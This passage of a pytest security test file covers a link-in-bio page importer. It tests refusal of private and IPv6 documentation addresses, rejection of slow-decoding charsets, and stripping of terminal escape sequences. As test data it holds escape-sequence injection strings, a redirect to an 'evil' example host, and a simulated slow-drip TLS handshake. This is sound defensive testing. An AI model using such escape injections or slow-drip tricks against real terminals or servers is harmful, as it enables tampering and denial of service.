    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], status=502)
    assert r["error"] == "linktr.ee's address is not public (10.0.0.1)"
    out = capsys.readouterr().out
    assert "link-in-bio import of https://linktr.ee/alice: linktr.ee's address is not public" in out


def test_the_page_is_never_logged(bio, client, monkeypatch, capsys):
    secret = "<a href='https://x.com/example_user1'>SECRET-PAGE-TEXT</a>"
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(secret).fetcher())
    bio_import(client, bio["id"])
    out = capsys.readouterr()
    assert "SECRET-PAGE-TEXT" not in out.out + out.err
    assert "https://linktr.ee/alice: 1 accounts, 0 other links" in out.out


def test_busy_is_a_429(bio, client, monkeypatch):
    monkeypatch.setattr(biofetch, "FETCHER", Untouchable())
    with biofetch._busy:
        assert "another" in bio_import(client, bio["id"], status=429)["error"]


@pytest.mark.parametrize("charset", ["idna", "undefined", "rot13", "hex", "base64"])
def test_a_charset_that_is_not_a_text_codec_falls_back_to_utf8(charset):
    net = Net(pages={("linktr.ee", "/a"): html_answer(b"<p>ok</p>", headers={
        "Content-Type": f"text/html; charset={charset}"})})
    assert net.get("https://linktr.ee/a").text == "<p>ok</p>"


@pytest.mark.parametrize("link", [
    "https://www.youtube.com/shorts/AbC123xyz", "https://www.youtube.com/shorts", "https://www.pixiv.net/en/artworks/12345",
    "https://www.youtube.com/@name/shorts/AbC", "https://www.tiktok.com/@name/video/1",
])
def test_posts_and_videos_are_not_profiles(link):
    table = {**ROUTES, "pixiv.net": "gallery-dl"}
    assert biofetch.profile(link, table) is None


def test_profile_prefixes_still_work():
    table = {**ROUTES, "pixiv.net": "gallery-dl"}
    assert biofetch.profile("https://www.pixiv.net/en/users/12345", table)[1] == "12345"
    assert biofetch.profile("https://www.youtube.com/@name/shorts", ROUTES)[1] == "name"


def test_a_broken_link_in_the_page_is_counted_not_a_crash(bio, client, monkeypatch):
    page = '<a href="https://[oops">x</a><a href="https://x.com/example_user1">x</a>'
    monkeypatch.setattr(biofetch, "FETCHER", bio_net(page).fetcher())
    r = bio_import(client, bio["id"])
    assert len(r["accounts"]) == 1 and r["other"] == 1


# ---------------------------------------------------------------------------
# Security audit 3
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("address", ["fec0::1", "feff:ffff::1", "3fff::1", "3fff:fff:ffff::1"])
def test_site_local_and_documentation_v6_are_not_public(address):
    """fec0::/10 (site-local, deprecated but still routed on some networks)
    and 3fff::/20 (documentation) pass ipaddress' is_global on Python 3.12."""
    assert not biofetch.public(address)
    net = Net(dns={"linktr.ee": [address]})
    assert "address is not public" in refused(net, "https://linktr.ee/alice")
    assert net.connects == []


@pytest.mark.parametrize("charset", ["punycode", "utf-7", "raw_unicode_escape", "unicode_escape"])
def test_only_web_charsets_decode_the_page(charset):
    """Python's punycode decoder is quadratic (2 MB took 156 s of CPU, under
    the fetch lock and past the time limit); a page decodes with the charsets
    web pages use, else as UTF-8."""
    body = b"x-" + b"a" * 64
    net = Net(pages={("linktr.ee", "/a"): html_answer(body, headers={
        "Content-Type": f"text/html; charset={charset}"})})
    assert net.get("https://linktr.ee/a").text == body.decode()


@pytest.mark.parametrize("charset, text", [
    ("Shift_JIS", "リンク"), ("windows-1251", "ссылка"), ("gb18030", "链接"), ("latin-1", "café"), ("us-ascii", "ok"),
])
def test_web_charsets_still_decode(charset, text):
    net = Net(pages={("linktr.ee", "/a"): html_answer(text.encode(charset), headers={
        "Content-Type": f"text/html; charset={charset}"})})
    assert net.get("https://linktr.ee/a").text == text


@pytest.mark.parametrize("headers", [
    {"Content-Type": "text/\x1b[2J\x1b]0;owned\x07plain"},
    {"Content-Type": "text/\x9b31mplain"},
])
def test_site_text_in_an_error_has_no_control_characters(bio, client, monkeypatch, capsys, headers):
    """The error shown and logged quotes the site's Content-Type (or a
    redirect's host): escape sequences must not reach the terminal."""
    net = bio_net("<p>x</p>")
    net.pages["linktr.ee", "/alice"] = html_answer(b"x", headers=headers)
    monkeypatch.setattr(biofetch, "FETCHER", net.fetcher())
    r = bio_import(client, bio["id"], status=502)
    out = capsys.readouterr().out
    assert r["error"].startswith("not a web page")
    for text in (r["error"], out):
        assert not any(not c.isprintable() and c != "\n" for c in text), repr(text)


def test_a_redirect_host_in_an_error_has_no_control_characters():
    net = Net(pages={("linktr.ee", "/a"): redirect("https://evil\x9b31m.example/")})
    error = refused(net, "https://linktr.ee/a")
    assert "not an allowed site" in error and all(c.isprintable() for c in error), repr(error)


def test_the_tls_handshake_has_one_total_limit():
    """The handshake runs under the socket's timeout as a whole (CPython's
    _ssl keeps one deadline across its reads), not a fresh timeout per read:
    a site dripping a byte every 0.2 s is cut at the time left. A local
    socket pair, nothing leaves this machine."""
    import threading
    import time
    a, b = socket.socketpair()
    stop = threading.Event()

    def drip():
        b.recv(65536)                                        # the ClientHello
        b.sendall(b"\x16\x03\x03\x40\x00")                   # a 16 KB handshake record follows...
        while not stop.wait(0.2):
            try:
                b.sendall(b"\x00")                           # ...a byte at a time
            except OSError:
                return
    threading.Thread(target=drip, daemon=True).start()
    a.settimeout(0.6)
    start = time.monotonic()
    try:
        with pytest.raises((socket.timeout, ssl.SSLError)):
            biofetch.system_wrap(a, "linktr.ee")
        assert time.monotonic() - start < 2
    finally:
        stop.set()
        a.close()
        b.close()


def test_web_charsets_are_codec_names():
    import codecs
    for name in biofetch.WEB_CHARSETS:
        assert codecs.lookup(name).name == name
